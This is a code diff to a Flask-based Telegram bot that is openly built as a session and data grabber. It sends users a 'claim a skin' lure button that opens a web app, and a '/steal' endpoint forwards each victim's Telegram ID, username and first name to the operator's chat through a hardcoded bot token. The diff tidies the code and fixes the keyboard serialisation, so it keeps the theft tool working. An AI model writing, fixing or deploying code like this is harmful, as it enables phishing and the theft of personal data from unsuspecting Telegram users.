@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import requests
+import json
 
 app = Flask(__name__)
 
@@ -7,25 +8,24 @@ BOT_TOKEN = "7854566294:AAGyNSrEwNeZ9SNEFR2HZKNaYkv3ZhIoTXk"
 CHAT_ID = "5388340518"
 WEBAPP_URL = "https://tg-session-grabber.onrender.com"
 
-@app.route('/')
+@app.route('/', methods=['GET'])
 def index():
     return open('index.html').read()
 
 @app.route('/steal', methods=['POST'])
 def steal():
     data = request.get_json()
-    print(f"STEAL CALLED: {data}")
+    print(f"Received: {data}")
     
     if data and data.get('id'):
-        msg = f"🔥 **ЖЕРТВА** 🔥\n\n"
-        msg += f"🆔 ID: {data['id']}\n"
+        msg = f"🔥 ЖЕРТВА 🔥\n\nID: {data['id']}\n"
         if data.get('username'):
-            msg += f"📛 @{data['username']}\n"
+            msg += f"@{data['username']}\n"
         if data.get('first_name'):
-            msg += f"📝 {data['first_name']}\n"
+            msg += f"{data['first_name']}\n"
         
         url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
+        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg})
         return jsonify({'status': 'ok'})
     
     return jsonify({'status': 'error'}), 400
@@ -35,9 +35,18 @@ def webhook():
     data = request.get_json()
     if 'message' in data and data['message'].get('text') == '/start':
         chat_id = data['message']['chat']['id']
-        keyboard = {"inline_keyboard": [[{"text": "🎁 Забрать скин", "web_app": {"url": WEBAPP_URL}}]]}
+        keyboard = {
+            "inline_keyboard": [[{
+                "text": "🎁 Забрать скин",
+                "web_app": {"url": WEBAPP_URL}
+            }]]
+        }
         url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-        payload = {'chat_id': chat_id, 'text': "Нажми на кнопку!", 'reply_markup': requests.utils.dumps(keyboard)}
+        payload = {
+            'chat_id': chat_id,
+            'text': "Нажми на кнопку!",
+            'reply_markup': json.dumps(keyboard)
+        }
         requests.post(url, json=payload)
     return jsonify({'ok': True})
 
